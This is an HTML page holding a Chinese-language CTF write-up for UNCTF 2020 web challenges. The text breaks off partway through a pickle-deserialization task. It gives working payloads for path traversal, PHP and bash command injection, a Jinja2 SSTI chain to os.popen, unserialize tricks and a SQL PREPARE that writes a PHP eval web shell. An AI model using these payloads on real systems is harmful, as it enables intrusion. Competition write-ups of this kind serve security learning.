@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Webeasy_ssrf簡單的目錄穿越，構造 ?url&#x3D;&#x2F;unctf.com&#x2F;..&#x2F;flag 即可得到 flag。  1FLAG&amp;#123;78ef5928-3393-4b23-a9ca-de433e161c3a&amp;#125;  babyeval根據提示，可以知道 flag 在 flag.php 中。題目過濾了括號，根據 PHP 的特性整點反引號，再用 od 來輸出以繞過字元的檢測，構造 ?a&#x3D;ec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UNCTF 2020">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/774f8257.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Webeasy_ssrf簡單的目錄穿越，構造 ?url&#x3D;&#x2F;unctf.com&#x2F;..&#x2F;flag 即可得到 flag。  1FLAG&amp;#123;78ef5928-3393-4b23-a9ca-de433e161c3a&amp;#125;  babyeval根據提示，可以知道 flag 在 flag.php 中。題目過濾了括號，根據 PHP 的特性整點反引號，再用 od 來輸出以繞過字元的檢測，構造 ?a&#x3D;ec">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121751204.9636c5c17aa1c69f7e391a64f8387c81aa5df0a7.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121904308.bedbb95d2b65798a516bfb9acd34393c2ab6b3ba.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122167826.d153ca02a60f3375cdf9005e0701130b853219ac.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122403630.b391e6a29b3c7684719dd2935586df66b14b71f0.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122647160.faf716599f6680c58b30331b208d16f5fef0b694.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122809152.05e7211282a1e1807f8e88a212a7f12c166c2e22.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123024658.c30471900b24d94744e84eabb6cfcc2e9e4a2394.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123272140.ff1b9e10381366286020a6f8b504080bb2938ac0.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123502272.c6fa4cc694961b245795b54f5f2229cb5e397cc1.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123625996.abd50ca76fc3fe323cfc90102204b333cc8981fe.png">
+<meta property="article:published_time" content="2021-01-25T17:41:00.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:20.982Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121751204.9636c5c17aa1c69f7e391a64f8387c81aa5df0a7.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>UNCTF 2020</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/1e5698e5.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/1e5698e5.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/774f8257.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/774f8257.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&text=UNCTF 2020"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&is_video=false&description=UNCTF 2020"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=UNCTF 2020&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/774f8257.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&name=UNCTF 2020&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/774f8257.html&t=UNCTF 2020"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-ssrf"><span class="toc-number">1.1.</span> <span class="toc-text">easy_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyeval"><span class="toc-number">1.2.</span> <span class="toc-text">babyeval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UN%E2%80%99s-online-tools"><span class="toc-number">1.3.</span> <span class="toc-text">UN’s_online_tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyflask"><span class="toc-number">1.4.</span> <span class="toc-text">easyflask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-number">1.5.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyunserialize"><span class="toc-number">1.6.</span> <span class="toc-text">easyunserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.7.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin-sql"><span class="toc-number">1.8.</span> <span class="toc-text">checkin-sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-flask2"><span class="toc-number">1.9.</span> <span class="toc-text">easy_flask2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%B0%E9%99%BD%E4%BA%BA%E7%B7%A8%E7%A2%BC"><span class="toc-number">2.1.</span> <span class="toc-text">陰陽人編碼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YLB%E2%80%99s-CAPTCHA-%E7%B0%BD%E5%88%B0%E9%A1%8C"><span class="toc-number">2.2.</span> <span class="toc-text">YLB’s CAPTCHA - 簽到題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baba-is-you"><span class="toc-number">2.3.</span> <span class="toc-text">baba_is_you</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        UNCTF 2020
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-25T17:41:00.000Z" itemprop="datePublished">2021-01-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>簡單的目錄穿越，構造 <code>?url=/unctf.com/../flag</code> 即可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121751204.9636c5c17aa1c69f7e391a64f8387c81aa5df0a7.png" alt="image-20201115205450581"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;78ef5928-3393-4b23-a9ca-de433e161c3a&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><p>根據提示，可以知道 flag 在 flag.php 中。題目過濾了括號，根據 PHP 的特性整點反引號，再用 od 來輸出以繞過字元的檢測，構造 <code>?a=echo `od -A d -c f???.???`; </code> 可以得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121904308.bedbb95d2b65798a516bfb9acd34393c2ab6b3ba.png" alt="image-20201115210404436"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;0b8654d3-3a70-4549-bf90-ef9b58d8cfef&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><p>bash 指令的堆疊，過濾了一些字元，使用 <code>%0a</code> 作為指令分割，<code>%09</code> 作為指令中的分隔，構造 <code>?url=1.1.1.1%0aod%09-A%09d%09-c%09/f???%0a</code> 即可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122167826.d153ca02a60f3375cdf9005e0701130b853219ac.png" alt="image-20201115211301682"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;d0faa519-cb49-404a-a99b-891d37c5690d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p>在 <code>/register</code> 路由下注冊使用者名稱為 <code>admin</code> 的使用者後在 <code>/login</code> 下登入，回到首頁後可以得到 <code>admin login success and check the secret route /secret_route_you_do_not_know</code>。</p>
+<p>定位到提示的路由，發現一個 <code>guess</code> 引數，發現存在 SSTI。繼續嘗試發現很多字元被 ban 了，於是嘗試 attr 繞過。以 <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;</code> 範本，構造 attr 繞過引數，得到如下結果。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;(config|attr(request.args.param)|attr(request.args.param1)|attr(request.args.param2)|attr(request.args.param3)(request.args.param4)|attr(request.args.param5)(request.args.param6)|attr(request.args.param7)())&#125;&#125;</span><br><span class="line">&amp;param=__class__</span><br><span class="line">&amp;param1=__init__</span><br><span class="line">&amp;param2=__globals__</span><br><span class="line">&amp;param3=__getitem__</span><br><span class="line">&amp;param4=os</span><br><span class="line">&amp;param5=popen</span><br><span class="line">&amp;param6=ls</span><br><span class="line">&amp;param7=read</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>__pycache__ app.py flag.txt templates error!!</code> 的回顯，可知 flag 在當前目錄下，繼續構造 <code>cat flag.txt</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;f1065588-34fc-4817-809d-753b58da3321&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>字串和 bool 的 true弱比較的時候相等，配合反序列化控制變數。構造出 payload 如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span>=&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="literal">true</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</code>。將其以 POST 的方式作為引數 <code>data</code> 傳送，即可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122403630.b391e6a29b3c7684719dd2935586df66b14b71f0.png" alt="image-20201115221423513"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;40371f04-6f0f-4eb9-8768-85e503928711&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><p>反序列化字元逃逸，關鍵在於 <code>return str_replace(&#39;challenge&#39;, &#39;easychallenge&#39;, $string);</code> 的少變多的操作，可以在序列化字串末尾拼接逃逸。計算逃逸字元數並構造 payload 如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="keyword">new</span> a(<span class="string">&quot;LemonPrefectchallengechallengechallengechallengechallengechallengechallengechallenge\&quot;;s:8:\&quot;password\&quot;;s:4:\&quot;easy\&quot;;&#125;nox&quot;</span>, <span class="string">&quot;easy&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:116:&quot;LemonPrefecteasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;nox&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>，將其中需要填入的引數取出，構造得 <code>?1=LemonPrefecteasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;nox</code>。將構造所得引數作為 GET 引數發起請求即可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122647160.faf716599f6680c58b30331b208d16f5fef0b694.png" alt="image-20201115223022446"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;78cae2f3-89df-4ae3-a63c-23ef9efa0383&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>檢視 response header 中的 <code>X-Powered-By: PHP/7.4.5</code>， 查閱手冊可知程式碼中部分函式已經被停用，進而簡化程式碼如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$adminPassword</span> = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$totals</span> = array_merge(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$key</span>&#125;;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable">$temp_array</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$key2</span> =&gt; <span class="variable">$value2</span>) &#123;</span><br><span class="line">                    <span class="variable">$temp_array</span>[<span class="variable">$key2</span>] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim(<span class="variable">$value2</span>))));</span><br><span class="line">                &#125;</span><br><span class="line">                $&#123;<span class="variable">$key</span>&#125; = <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="variable">$temp_array</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $&#123;<span class="variable">$key</span>&#125; = <span class="variable">$_GET</span>[<span class="variable">$key</span>] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim(<span class="variable">$value</span>))));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能設定環境變數</span></span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$password</span>) === <span class="variable">$adminPassword</span> &amp;&amp; sha1(<span class="variable">$verif</span>) == <span class="variable">$verif</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="variable">$GLOBALS</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="variable">$key</span>) &amp;&amp; strlen(<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> strlen((<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="variable">$GLOBALS</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>審計可知所有請求變數會被設定至全域性，同時所有單引號和雙引號均會被加上反斜槓以轉義。設定環境變數的地方進行了簡單的 md5 和 sha1 驗證，同時對引數長度和名稱做出限定。</p>
+<p><code>adminPassword</code> 可以直接利用變數的全域性設定輕鬆覆蓋，因此得到<code>password=LemonPrefect&amp;adminPassword=7f41a8661986fdd34d63d4cdde2249c5</code>。查閱資料可知，<code>0e01000111101111110010010010000001001001</code> 的 sha1 仍然為 <code>0e</code> 開頭，進而達成 0 == 0 的比較。利用一個全域性變數加一個將被拼接執行的變數 <code>var1</code> 即可達成檢視 phpinfo。同時，<code>var1</code> 需要配合語句的閉合。因此，構造 <code>var1=\&quot;;$b();?&gt;</code>，<code>b=phpinfo</code>。</p>
+<p>整理上述引數，得到 payload。</p>
+ <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?password=LemonPrefect</span><br><span class="line">&amp;adminPassword=7f41a8661986fdd34d63d4cdde2249c5</span><br><span class="line">&amp;verif=0e01000111101111110010010010000001001001</span><br><span class="line">&amp;b=phpinfo </span><br><span class="line">&amp;var1=\&quot;;$b();?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>將上述引數構造請求傳送即可得到 phpinfo，在其中可以找到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122809152.05e7211282a1e1807f8e88a212a7f12c166c2e22.png" alt="image-20201115225456544"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;720731af-7dc9-45fa-b252-a82cc4601de9&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><p>看起來很像人畜無害的隨便注，然而隨便注的三種套路都不行。關鍵在於 <code>PREPARE</code> 與十六進位制的配合。 <code>PREPARE</code> 可以構造出 <code>prepare d from 0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027;execute d;</code> 這樣的語句來寫入一個檔案，從而直接 getshell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027</span><br><span class="line">&#x3D;&gt; select&#x2F;**&#x2F;&quot;&lt;?php @eval($_POST[a]); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p>getshell 之後直接構造 <code>system(&quot;cat /flag&quot;);</code> 可得 flag。</p>
+<h3 id="easy-flask2"><a href="#easy-flask2" class="headerlink" title="easy_flask2"></a>easy_flask2</h3><blockquote>
+<p><strong>pickle 反序列化 參考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>
+</blockquote>
+<p>從 <code>/source</code> 路由讀取原始碼，可以發現 flag 存放在環境變數中。同時發現可控的 pickle 反序列化點，簡單過濾了 <code>R</code>。</p>
